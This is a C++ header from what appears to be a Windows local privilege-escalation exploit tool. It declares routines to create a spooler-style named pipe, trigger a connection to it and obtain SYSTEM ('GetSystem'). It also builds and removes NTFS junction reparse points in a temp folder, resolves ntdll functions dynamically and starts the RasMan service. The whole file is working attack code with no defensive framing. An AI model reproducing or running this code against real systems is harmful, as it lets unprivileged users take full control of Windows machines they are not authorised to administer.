#pragma once
#include <Windows.h>
#include <winternl.h>
#include <iostream>
#include <string>
#define VERSION L"0.1"

#pragma warning(disable:4996)
#pragma warning( disable : 28251 )

#define DEBUG FALSE


VOID PrintUsage();
DWORD DoMain();
BOOL CheckAndEnablePrivilege(HANDLE hTokenToCheck, LPCWSTR pwszPrivilegeToCheck);
BOOL GenerateRandomPipeName(LPWSTR* ppwszPipeName);
HANDLE CreateSpoolNamedPipe(LPWSTR pwszPipeName);
HANDLE ConnectSpoolNamedPipe(HANDLE hPipe);
HANDLE TriggerNamedPipeConnection(LPWSTR pwszPipeName);
DWORD WINAPI TriggerNamedPipeConnectionThread(LPVOID lpParam);
BOOL GetSystem(HANDLE hPipe);
BOOL Finish();

LPSTR temp_dir = getenv("TEMP");
LPSTR new_temp_dir[MAX_PATH];
LPSTR unc_temp_dir[MAX_PATH];

typedef struct _REPARSE_DATA_BUFFER {
    ULONG  ReparseTag;
    USHORT ReparseDataLength;
    USHORT Reserved;
    union {
        struct {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            ULONG  Flags;
            WCHAR  PathBuffer[1];
        } SymbolicLinkReparseBuffer;
        struct {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            WCHAR  PathBuffer[1];
        } MountPointReparseBuffer;
        struct {
            UCHAR DataBuffer[1];
        } GenericReparseBuffer;
    } DUMMYUNIONNAME;
} REPARSE_DATA_BUFFER, * PREPARSE_DATA_BUFFER;
typedef struct _OBJECT_DIRECTORY_INFORMATION {
    UNICODE_STRING Name;
    UNICODE_STRING TypeName;
} OBJECT_DIRECTORY_INFORMATION, * POBJECT_DIRECTORY_INFORMATION;
#define STATUS_MORE_ENTRIES 0x00000105
#define STATUS_NO_MORE_ENTRIES 0x8000001A
#define IO_REPARSE_TAG_MOUNT_POINT              (0xA0000003L)
typedef NTSYSCALLAPI NTSTATUS(NTAPI* _NtSetInformationFile)(
    HANDLE                 FileHandle,
    PIO_STATUS_BLOCK       IoStatusBlock,
    PVOID                  FileInformation,
    ULONG                  Length,
    ULONG FileInformationClass
    );
_NtSetInformationFile pNtSetInformationFile;

typedef NTSYSAPI VOID(NTAPI* _RtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
_RtlInitUnicodeString pRtlInitUnicodeString;

typedef NTSYSAPI NTSTATUS(NTAPI* _NtCreateFile)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK   IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);
_NtCreateFile pNtCreateFile;


BOOL CreateJunction(HANDLE hDir, LPCWSTR target) {
    HANDLE hJunction;
    DWORD cb;
    wchar_t printname[] = L"";
    if (hDir == INVALID_HANDLE_VALUE) {
        printf("[!] HANDLE invalid!\n");
        return FALSE;
    }
    SIZE_T TargetLen = wcslen(target) * sizeof(WCHAR);
    SIZE_T PrintnameLen = wcslen(printname) * sizeof(WCHAR);
    SIZE_T PathLen = TargetLen + PrintnameLen + 12;
    SIZE_T Totalsize = PathLen + (DWORD)(FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer));
    PREPARSE_DATA_BUFFER Data = (PREPARSE_DATA_BUFFER)malloc(Totalsize);
    Data->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    Data->ReparseDataLength = PathLen;
    Data->Reserved = 0;
    Data->MountPointReparseBuffer.SubstituteNameOffset = 0;
    Data->MountPointReparseBuffer.SubstituteNameLength = TargetLen;
    memcpy(Data->MountPointReparseBuffer.PathBuffer, target, TargetLen + 2);
    Data->MountPointReparseBuffer.PrintNameOffset = (USHORT)(TargetLen + 2);
    Data->MountPointReparseBuffer.PrintNameLength = (USHORT)PrintnameLen;
    memcpy(Data->MountPointReparseBuffer.PathBuffer + wcslen(target) + 1, printname, PrintnameLen + 2);
    WCHAR dir[MAX_PATH] = { 0x0 };
    if (DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT, Data, Totalsize, NULL, 0, &cb, NULL) != 0)
    {

        GetFinalPathNameByHandle(hDir, dir, MAX_PATH, 0);
        if(DEBUG)
            printf("[+] Junction %ls -> %ls created!\n", dir, target);
        free(Data);
        return TRUE;

    }
    else
    {

        printf("[!] Error: %d. Exiting\n", GetLastError());
        free(Data);
        return FALSE;
    }
}
BOOL DeleteJunction(HANDLE handle) {
    REPARSE_GUID_DATA_BUFFER buffer = { 0 };
    BOOL ret;
    buffer.ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    DWORD cb = 0;
    IO_STATUS_BLOCK io;
    if (handle == INVALID_HANDLE_VALUE) {
        printf("[!] HANDLE invalid!\n");
        return FALSE;
    }
    WCHAR dir[MAX_PATH] = { 0x0 };
    if (DeviceIoControl(handle, FSCTL_DELETE_REPARSE_POINT, &buffer, REPARSE_GUID_DATA_BUFFER_HEADER_SIZE, NULL, NULL, &cb, NULL)) {
        GetFinalPathNameByHandle(handle, dir, MAX_PATH, 0);
        if(DEBUG)
            printf("[+] Junction %ls deleted!\n", dir);
        return TRUE;
    }
    else
    {
        printf("[!] Error: %d.\n", GetLastError());
        return FALSE;
    }
}

BOOL CheckRasman() {

    SC_HANDLE scm, svc;
    SERVICE_STATUS_PROCESS service_status;
    BOOL status;
    DWORD bytes;
    scm = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (scm == NULL) {
        printf("[!] Cannot open service manager\n");
        return FALSE;
    }
    svc = OpenService(scm, L"rasman", SERVICE_START | SERVICE_QUERY_STATUS);
    if (svc == NULL)
    {
        printf("[!] Cannot open service\n");
        CloseServiceHandle(scm);
        return FALSE;
    }
    status = QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, (LPBYTE)&service_status, sizeof(SERVICE_STATUS_PROCESS), &bytes);
    if (status == 0)
    {
        printf("[!] Cannot query service\n");
        CloseServiceHandle(scm);
        CloseServiceHandle(svc);
        return FALSE;
    }
    if (service_status.dwCurrentState != SERVICE_RUNNING) {
        printf("[!] Rasman service is not running!\n[*] Trying to start it..\n");
        if (!StartService(svc, 0, NULL)) {
            printf("[!] Cannot start service!\n");
            CloseServiceHandle(scm);
            CloseServiceHandle(svc);
            return FALSE;
        }
        printf("[+] Service started!\n");
        Sleep(2000);
        CloseServiceHandle(scm);
        CloseServiceHandle(svc);
        return TRUE;

    }
    printf("[+] Rasman service is running!\n");
    CloseServiceHandle(scm);
    CloseServiceHandle(svc);
    return TRUE;
}

void init() {
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    if (ntdll != NULL) {
        pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
        pNtCreateFile = (_NtCreateFile)GetProcAddress(ntdll, "NtCreateFile");
        pNtSetInformationFile = (_NtSetInformationFile)GetProcAddress(ntdll, "NtSetInformationFile");

    }
    if (pRtlInitUnicodeString == NULL || pNtCreateFile == NULL) {
        printf("Cannot load api's %d\n", GetLastError());
        exit(0);
    }

    std::string temp = std::string(temp_dir);

    strcat((char*)new_temp_dir, temp.c_str());
    strcat((char*)new_temp_dir, "\\Crispr");

    temp.replace(temp.find(":"), 1, "$").c_str();
    strcat((char*)unc_temp_dir, temp.c_str());
    strcat((char*)unc_temp_dir, "\\Crispr");


    // Check Service Start or Stop
    if (!CheckRasman()) {
        printf("[+] Rasman service is error\n");
        exit(-1);
    }

}